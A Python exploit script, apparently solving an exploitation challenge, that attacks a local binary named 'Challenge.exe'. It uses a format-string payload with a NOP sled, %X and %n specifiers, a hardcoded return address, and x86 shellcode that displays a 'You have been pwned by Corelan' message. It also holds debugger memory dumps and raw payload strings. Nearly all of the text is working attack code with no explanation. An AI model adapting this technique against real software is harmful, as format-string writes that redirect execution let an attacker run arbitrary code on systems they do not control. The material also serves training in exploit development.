# coding: ascii

import struct
import subprocess
import os

ret = struct.pack("I", 0x0019f720)
buffer_length = 198

shellcode = ("\x33\xc0"
"\x50"
"\x68\x6c\x61\x6e\x20"   
"\x68\x43\x6f\x72\x65"   
"\x8b\xdc"               
"\x50"                   
"\x68\x61\x6e\x20\x20"   
"\x68\x6f\x72\x65\x6c"    
"\x68\x62\x79\x20\x43"    
"\x68\x6e\x65\x64\x20"   
"\x68\x6e\x20\x70\x77"   
"\x68\x20\x62\x65\x65"   
"\x68\x68\x61\x76\x65"   
"\x68\x59\x6f\x75\x20"   
"\x8b\xcc"               
"\x33\xc0"              
"\x50"                   
"\x53"                 
"\x51"                   
"\x50"   
"\x68"    
"AAAA"    
"\xc7\xc6\x60\x06\x10\x75"  
"\xff\xe6")     


def generate_payload(code):
	final = code + (buffer_length-len(code))*"\x90" + "%X" * 120 + "%.999999x" + "%.299999x" + "%.399999x" + "%.549x" + "%n" + 23 * "E" + ret
	return final.split("\x00")[0]

args = "Challenge.exe " + generate_payload(shellcode)
subprocess.call(args, shell=False)

print("A" * 198 + "%X" * 120 + "%.399999x" + "%.441211x" + "%.399999x" + "%.609x" + "%n" + 23 * "E" + "Z" * 4 + "G" * 100)

# 0019f300 
# 0019f490 452 -> 852
# 0019f748

# 00125628 
# 0012f760 <- 0012f6c0 

"""
0:000> d 0019f720
0019f720  00401188 00407160 0019f921 0019f93c
0019f730  00407160 00401402 00401402 0020f000
0019f740  00401043 0019f748 41414141 41414141
0019f750  41414141 41414141 41414141 41414141
0019f760  41414141 41414141 41414141 41414141
0019f770  41414141 41414141 41414141 41414141
0019f780  41414141 41414141 41414141 41414141
0019f790  41414141 41414141 41414141 41414141
"""

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%.399999x%.441211x%.399999x%.687x%nZZZZQQQQWWWWEEEERRRRTTTTYYYYUUUUIIIIOOOOPPPPAAAASSSSDDDDFFFFGGGGHHHHJJJJKKKKLLLLZZZZXXXXCCCCVVVVBBBBNZZZZ

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%.399999x%.441211x%.399999x%.609x%nZZZZQQQQWWWWEEEERRRRTTTTYYYYUUUUIIIIOOOOPPPPAAAASSSSDDDDFFFFGGGGHHHHJJJJKKKKLLLLZZZZXXXXCCCCVVVVBBBBNZZZZ